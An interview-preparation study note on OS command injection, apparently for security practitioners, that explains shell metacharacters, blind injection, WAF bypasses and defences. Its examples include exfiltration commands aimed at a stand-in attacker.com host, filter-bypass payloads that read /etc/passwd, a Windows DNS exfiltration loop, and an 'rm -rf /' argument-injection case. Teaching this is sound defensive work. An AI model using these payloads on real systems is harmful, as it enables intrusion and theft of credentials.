---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 08"
---

# Command Injection Interview Guide

## Formal Technical Questions

### Q1: What is the fundamental root cause of OS Command Injection, and how does it differ from Code Injection?
**Answer:**
The root cause of OS Command Injection is the improper neutralization of special elements (shell metacharacters) used in an OS command. It occurs when an application passes unsafe user-supplied data directly to a system shell (e.g., via functions like `system()`, `exec()`, `popen()`, or backticks in PHP/Node.js/Python). The shell interprets the user's payload not as data, but as executable command instructions.
**Difference from Code Injection:**
- **OS Command Injection:** The attacker injects operating system commands. The vulnerability lies in the interaction between the application and the underlying OS shell (Bash, cmd.exe). The attacker's payload is executed by the OS.
- **Code Injection:** The attacker injects native application code (e.g., PHP, Python, Java). The vulnerability lies in functions that dynamically evaluate language code (e.g., `eval()`, `assert()`). The attacker's payload is executed by the application's runtime environment, not directly by the OS shell.

### Q2: Detail the various shell metacharacters used to chain commands in both Unix and Windows environments.
**Answer:**
Attackers use shell metacharacters to break out of the intended command context and append their own commands.
- **Unix/Linux:**
  - `;` (Semicolon): Executes the subsequent command sequentially, regardless of the success of the first.
  - `&&` (Logical AND): Executes the second command only if the first command succeeds (exit status 0).
  - `||` (Logical OR): Executes the second command only if the first command fails.
  - `|` (Pipe): Passes the standard output of the first command as standard input to the second command.
  - `$()`, ` `` ` (Command Substitution): Executes the inner command and replaces the expression with its output before running the outer command.
  - `\n` (Newline - `0x0a`): Acts as a command terminator and initiates a new command execution.
- **Windows:**
  - `&` (Ampersand): Executes commands sequentially.
  - `&&` (Logical AND): Executes the second command only if the first succeeds.
  - `||` (Logical OR): Executes the second command only if the first fails.
  - `|` (Pipe): Pipes output to input.
  - `%0a` (Newline): Initiates a new command.

### Q3: Explain the concept of Blind Command Injection. What techniques can an attacker use to verify execution and exfiltrate data?
**Answer:**
Blind Command Injection occurs when the application executes the injected OS command but does not return the output of the command in the HTTP response.
**Verification Techniques:**
- **Time-Based (Delay):** The attacker injects a command that causes a delay, such as `ping -c 10 127.0.0.1` or `sleep 10`. If the server response takes 10 seconds longer than normal, the injection is confirmed.
- **Out-of-Band (OOB) / Network Interaction:** The attacker forces the server to initiate an external connection to an attacker-controlled listener. Example: `curl http://attacker.com/ping` or `nslookup attacker.com`.

**Data Exfiltration Techniques:**
- **OOB DNS:** The attacker encodes the command output into a subdomain query. Example: `nslookup $(whoami).attacker.com`. The attacker's DNS server logs the query, revealing the output (e.g., `root.attacker.com`).
- **OOB HTTP:** The attacker sends the data as a parameter or payload to their server. Example: `curl -X POST -d @/etc/passwd http://attacker.com/leak`.
- **File Writing (Semi-Blind):** The attacker redirects the command output to a file within the web root (e.g., `id > /var/www/html/output.txt`), and then retrieves the file via a standard HTTP GET request.

### Q4: How can an attacker bypass WAF filters that block spaces in command injection payloads?
**Answer:**
Web Application Firewalls (WAFs) often blacklist space characters or space-separated command patterns. Attackers use shell-specific variables and syntax to circumvent this.
- **Using `$IFS` (Internal Field Separator):** In Bash, `$IFS` defaults to space, tab, and newline. An attacker can replace spaces with `$IFS`. Example: `cat$IFS/etc/passwd`.
- **Brace Expansion:** Shells use brace expansion to generate arguments. Example: `{cat,/etc/passwd}` expands to `cat /etc/passwd`.
- **Input Redirection:** Using the `<` character instead of a space for commands that read files. Example: `cat</etc/passwd`.
- **Variable Construction:** Defining a variable with a space and using it. Example: `X=$' ';cat${X}/etc/passwd`.

## Scenario-Based Questions

### Q1: You are testing a network diagnostic portal that takes an IP address and runs a ping. The input field strictly rejects `;`, `|`, `&`, `$` and spaces. You suspect it uses `system("ping -c 4 " + input)`. How do you achieve command execution?
**Answer:**
The strict filtering of standard chaining metacharacters and spaces severely limits options. However, we can use newline characters and alternative space bypasses.
1. **Newline Injection:** The newline character `\n` (`%0a` URL-encoded) is often overlooked by filters focusing on printable characters. I would inject `%0a` to terminate the ping command and start a new one.
2. **Space Bypass:** Since spaces are blocked, I'll use input redirection (`<`).
3. **Payload Construction:** 
   Original input: `127.0.0.1`
   Malicious input: `127.0.0.1%0aid</etc/passwd`
4. **Execution Flow:** The server constructs:
   ```bash
   ping -c 4 127.0.0.1
   id</etc/passwd
   ```
   The newline breaks the command, and the second command executes successfully without using blocked characters.

### Q2: You are on a Red Team engagement. You've found a blind command injection on a Windows IIS server (`ping.exe` is being called). Outbound HTTP/HTTPS is blocked by egress firewalls, but DNS is permitted. How do you exfiltrate the output of the `whoami` command?
**Answer:**
Because it's a Windows environment and HTTP is blocked, I must use DNS exfiltration. Command substitution syntax differs from Linux. I cannot use `$(whoami)`.
1. **Windows Command Construction:** In Windows cmd, I can iterate over the output of a command using a `FOR` loop and execute another command for each line.
2. **The Payload:** I will use the `nslookup` command to query a subdomain of my Collaborator server.
   The payload will look like this:
   `127.0.0.1 & FOR /F %i IN ('whoami') DO nslookup %i.mycollaborator.com`
3. **Execution:** 
   - The server pings `127.0.0.1`.
   - The `&` operator chains the next command.
   - The `FOR` loop executes `whoami` (e.g., returns `nt authority\system`).
   - It iterates through the output and runs `nslookup nt authority\system.mycollaborator.com`.
   - *Note:* Windows paths/users often contain backslashes or spaces which might break the DNS query. A more refined approach involves setting a variable, replacing bad characters, and then querying.

## Deep-Dive Defensive Questions

### Q1: Your engineering team needs to write a feature in Python that calls an external binary (`nmap`) with user-supplied arguments (target IP). How do you architect this to be completely immune to command injection?
**Answer:**
The only infallible defense against command injection is to avoid calling an OS shell entirely.
1. **Use Safe APIs:** Instead of using functions that invoke a shell (like `os.system()` or `subprocess.Popen(shell=True)`), use APIs that execute the binary directly and pass arguments as an array/list.
2. **Implementation:**
   ```python
   import subprocess

   def run_nmap(target_ip):
       # BAD: subprocess.Popen(f"nmap {target_ip}", shell=True)
       
       # GOOD: Pass arguments as a list. shell=False is the default and crucial here.
       # The OS directly executes the binary, treating the list elements purely as arguments, not executable commands.
       try:
           result = subprocess.run(["nmap", "-Pn", target_ip], capture_output=True, text=True, check=True)
           return result.stdout
       except subprocess.CalledProcessError as e:
           return "Error running scan"
   ```
3. **Input Validation:** Even with safe APIs, implement strict input validation. If `target_ip` should only be an IP address, validate it against an IP regex or use an IP parsing library before passing it to the subprocess.

### Q2: An application uses `escapeshellarg()` in PHP to sanitize user input before passing it to `exec()`. Is this completely secure? What are the edge cases?
**Answer:**
`escapeshellarg()` adds single quotes around a string and quotes/escapes any existing single quotes within it. This effectively forces the shell to treat the entire string as a single literal argument.
While it prevents traditional shell metacharacter injection (like adding `; id`), it is **not** a silver bullet and fails under specific conditions:
- **Parameter/Argument Injection:** The attacker's input is securely enclosed as an argument, but they can still control the *content* of that argument. If the binary being called accepts malicious flags, the attacker can exploit it.
  - Example: `exec("find /var/www -name " . escapeshellarg($user_input));`
  - If `$user_input` is `-exec rm -rf / \;`, `escapeshellarg` converts it to `'-exec rm -rf / \;'`. The `find` command receives this as an argument and executes it, leading to devastating system deletion.
- **Defense:** `escapeshellcmd()` and `escapeshellarg()` should be considered legacy mitigations. The modern defense is parameterization (e.g., using `pcntl_exec` or strictly passing discrete arguments without invoking `/bin/sh -c`).

## Real-World Attack Scenario

### Blind Command Injection via PDF Generator
A banking portal allows users to generate a PDF receipt. The application takes the HTML of the receipt and passes it to the `wkhtmltopdf` binary via a shell command to generate the file. The filename is derived from the user's account name.

1. **Reconnaissance:** The attacker intercepts the request: `POST /generate_pdf` with body `{"account_name": "John Doe", "html": "..."}`.
2. **Detection:** The attacker injects a time-delay payload into the `account_name`: `John Doe' ; sleep 10 ; '`. The server responds 10 seconds later, confirming command injection. The backend is likely executing: `sh -c "wkhtmltopdf input.html receipts/John Doe' ; sleep 10 ; '.pdf"`.
3. **OOB Exfiltration Strategy:** Because the output is a PDF, the attacker cannot see the command output directly. They set up an HTTP listener on a public IP (`http://attacker.com:8000`).
4. **Exploitation:** The attacker injects a payload to read the database configuration file and send it via curl:
   ```json
   {
     "account_name": "test' ; curl -X POST -d @/var/www/html/config.php http://attacker.com:8000/exfil ; '",
     "html": "..."
   }
   ```
5. **Impact:** The backend executes the command. `wkhtmltopdf` runs, fails on the malformed name, but the shell continues to the next chained command, utilizing `curl` to POST the contents of `config.php` to the attacker's server, leaking database credentials.

```text
    User Input: test' ; curl -d @config.php http://attacker.com ; '
       |
       V
  [ Web Application ] 
       |
       V (system("wkhtmltopdf in.html " + input + ".pdf"))
  [ OS Shell (/bin/sh -c) ] --> wkhtmltopdf in.html test' ; curl -d @config.php http://attacker.com ; '.pdf
       |
       V
  [ Execution & Exfiltration ] ---- POST config.php ----> [ Attacker Server ]
```

## Chaining Opportunities
- Chaining with **Privilege Escalation** (e.g., exploiting SUID binaries or kernel exploits) after gaining initial low-privileged RCE.
- Chaining with **SSRF** to leverage the compromised host to attack internal infrastructure that the external attacker cannot route to directly.
- Chaining with **Data Exfiltration** to extract sensitive databases, environment variables (`.env`), or cryptographic keys.

## Related Notes
- [[12 - Operating System Architectures]]
- [[24 - Web Shells and Evasion]]
- [[25 - Egress Bypasses and OOB Techniques]]
